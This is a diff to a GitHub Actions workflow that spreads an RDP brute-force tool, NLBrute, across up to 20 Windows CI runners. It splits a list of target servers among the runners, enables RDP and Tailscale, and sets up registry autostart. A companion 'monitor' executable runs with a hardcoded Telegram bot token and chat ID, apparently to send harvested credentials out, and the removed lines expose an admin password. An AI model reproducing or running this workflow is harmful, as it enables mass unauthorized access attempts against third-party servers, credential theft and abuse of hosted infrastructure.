@@ -1,4 +1,4 @@
-name: Mass Server Deployment (Dynamic Matrix)
+name: Mass Server Deployment (Single File Mode)
 
 on:
   workflow_dispatch:
@@ -9,27 +9,10 @@ on:
         default: '10'
 
 jobs:
-  # JOB 1: Calculates the range
-  setup:
-    runs-on: ubuntu-latest
-    outputs:
-      server_ids: ${{ steps.set-ids.outputs.server_ids }}
-    steps:
-      - name: Generate Server ID Array
-        id: set-ids
-        shell: bash
-        run: |
-          TOTAL=${{ github.event.inputs.total_servers }}
-          IDS=$(python3 -c "import json; print(json.dumps(list(range(1, int('$TOTAL') + 1))))")
-          echo "server_ids=$IDS" >> $GITHUB_OUTPUT
-          echo "Generated IDs: $IDS"
-
-  # JOB 2: Performs the actual deployment
   deploy:
-    needs: setup
     strategy:
       matrix:
-        server_id: ${{ fromJSON(needs.setup.outputs.server_ids) }}
+        server_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
       fail-fast: false
 
     runs-on: windows-latest
@@ -39,7 +22,7 @@ jobs:
       - name: 1. Checkout Repo
         uses: actions/checkout@v4
 
-      - name: 2. Setup Workspace
+      - name: 2. Setup Workspace & Validate Input
         shell: powershell
         run: |
           $maxServers = [int]${{ github.event.inputs.total_servers }}
@@ -47,6 +30,12 @@ jobs:
           $workDir = "C:\target_app"
           $tempDir = "C:\split_data"
 
+          if ($currentId -gt $maxServers) {
+              Write-Host "!!! LIMIT REACHED: Skipping Server ID $currentId !!!" -ForegroundColor Yellow
+              exit 0
+          }
+
+          # Create clean workspace and a dedicated temp folder for the split file
           if (Test-Path $workDir) { Remove-Item -Recurse -Force $workDir -ErrorAction SilentlyContinue }
           if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue }
           New-Item -ItemType Directory -Path $workDir -Force | Out-Null
@@ -59,7 +48,7 @@ jobs:
           
           Write-Host "Initializing Server ID: $currentId" -ForegroundColor Cyan
 
-      - name: 3. Split servers.txt
+      - name: 3. Split servers.txt (Dynamic Partitioning)
         shell: powershell
         run: |
           $maxServers = [int]$env:MAX_SERVERS
@@ -67,21 +56,38 @@ jobs:
           $inputFile = "${{ github.workspace }}\servers.txt" 
           $outputFile = "$($env:TEMP_DIR)\servers.txt"
 
-          if (!(Test-Path $inputFile)) { exit 1 }
+          Write-Host "Reading master file from: $inputFile" -ForegroundColor Cyan
+          
+          if (!(Test-Path $inputFile)) {
+              Write-Error "CRITICAL: servers.txt not found in repository root!"
+              exit 1
+          }
 
           $allLines = Get-Content $inputFile | Where-Object { $_.Trim() -ne "" }
           $totalLines = $allLines.Count
+          
           if ($totalLines -eq 0) { exit 1 }
 
           $linesPerServer = [Math]::Floor($totalLines / $maxServers)
           $startIndex = ($currentId - 1) * $linesPerServer
-          $countToTake = if ($currentId -eq $maxServers) { $totalLines - $startIndex } else { $linesPerServer }
+          
+          $countToTake = $linesPerServer
+          if ($currentId -eq $maxServers) {
+              $countToTake = $totalLines - $startIndex
+          }
+
+          Write-Host "Server ${currentId}: Extracting ${countToTake} lines..." -ForegroundColor Cyan
 
           $serverLines = $allLines | Select-Object -Skip $startIndex -First $countToTake
-          if ($null -eq $serverLines -or $serverLines.Count -eq 0) { exit 1 }
 
+          if ($null -eq $serverLines -or $serverLines.Count -eq 0) {
+              Write-Error "No data found for Server ${currentId}."
+              exit 1
+          }
+
+          # Save the split file to a TEMPORARY directory to avoid collision during extraction
           $serverLines | Out-File -FilePath $outputFile -Encoding ascii -Force
-          Write-Host "Split file saved to: $outputFile" -ForegroundColor Green
+          Write-Host "Split file saved to temporary location: $outputFile" -ForegroundColor Green
 
       - name: 4. Enable RDP & Firewall
         run: |
@@ -106,8 +112,6 @@ jobs:
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="server-${{ matrix.server_id }}"
           Start-Sleep -Seconds 8
           $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-          
-          echo "TAILSCALE_IP=$ts_ip" >> $env:GITHUB_ENV
           Write-Host "Tailscale IP : $ts_ip" -ForegroundColor Yellow
 
       - name: 7. Deploy App & Setup Autostart
@@ -154,7 +158,7 @@ jobs:
               }
           }
 
-          # 4. Aggressive Injection
+          # 4. AGGRESSIVE INJECTION: Find EXE and Force Overwrite servers.txt
           Write-Host "Locating application files to inject split servers.txt..." -ForegroundColor Cyan
           $targetExe1 = "NLBrute_Manager.exe"
           $targetExe2 = "good.txt-monitor.exe"
@@ -163,21 +167,37 @@ jobs:
           $exeFile1 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe1 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
           $exeFile2 = Get-ChildItem -Path $env:WORK_DIR -Filter $targetExe2 -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
 
+          # Function to force-inject the file
+          function Force-Inject-Servers($exeFile, $sourceFile) {
+              if ($exeFile) {
+                  $exeDir = $exeFile.DirectoryName
+                  $destinationFile = Join-Path $exeDir "servers.txt"
+                  
+                  Write-Host "Targeting EXE Directory: $exeDir" -ForegroundColor Cyan
+                  Write-Host "Injecting split file to: $destinationFile" -ForegroundColor Yellow
+                  
+                  # Remove any existing servers.txt in that folder first to be absolutely sure
+                  if (Test-Path $destinationFile) { Remove-Item $destinationFile -Force }
+                  
+                  # Copy the split file from the TEMP directory
+                  Copy-Item -Path $sourceFile -Destination $destinationFile -Force
+                  Write-Host "Injection Successful!" -ForegroundColor Green
+              }
+          }
+
+          Force-Inject-Servers -exeFile $exeFile1 -sourceFile $splitFileSource
+          Force-Inject-Servers -exeFile $exeFile2 -sourceFile $splitFileSource
+
+          # 5. Registry & Autostart Setup
+          $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+
           # APP 1 Setup
           if ($exeFile1) {
               $exePath1 = $exeFile1.FullName
               $exeDir1 = Split-Path $exePath1 -Parent
-              $destinationFile1 = Join-Path $exeDir1 "servers.txt"
-              
-              # Overwrite servers.txt in app folder
-              if (Test-Path $destinationFile1) { Remove-Item $destinationFile1 -Force }
-              Copy-Item -Path $splitFileSource -Destination $destinationFile1 -Force
-              
               $vbsFile1 = "$($env:WORK_DIR)\launcher_manager.vbs"
               $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
               $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
-              
-              $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
               New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
               Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
           }
@@ -186,36 +206,14 @@ jobs:
           if ($exeFile2) {
               $exePath2 = $exeFile2.FullName
               $exeDir2 = Split-Path $exePath2 -Parent
-              $destinationFile2 = Join-Path $exeDir2 "servers.txt"
-              
-              # Overwrite servers.txt in app folder
-              if (Test-Path $destinationFile2) { Remove-Item $destinationFile2 -Force }
-              Copy-Item -Path $splitFileSource -Destination $destinationFile2 -Force
-
               $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
               $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
               $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
               $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
-              
-              $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
               New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
-          end
+          }
 
-          # 5. Summary Injection
-          $ip = $env:TAILSCALE_IP
-          $summary = "### 🚀 Server ${{ matrix.server_id }} Status`n"
-          $summary += "| Metric | Value |`n"
-          $summary += "| :--- | :--- |`n"
-          $summary += "| **Tailscale IP** | $ip |`n"
-          $summary += "| **Status** | `Deployed` |`n"
-          $summary += "| **User** | `NvdAdmin` |`n"
-          $summary += "| **Password** | `P@ssw0rd1qazXSW@#` |`n"
-          $summary += "---`n"
-          
-          $summary | Out-File -FilePath $env:GITHUB_STEP_SUMMARY -Encoding utf8 -Append
-          Write-Host "Summary pushed to GitHub UI" -ForegroundColor Green
-
-      - name: 8. Keep Server Alive (6 Hours)
+      - name: 6. Keep Server Alive (6 Hours)
         run: |
           for ($i = 1; $i -le 360; $i++) {
             Start-Sleep -Seconds 60
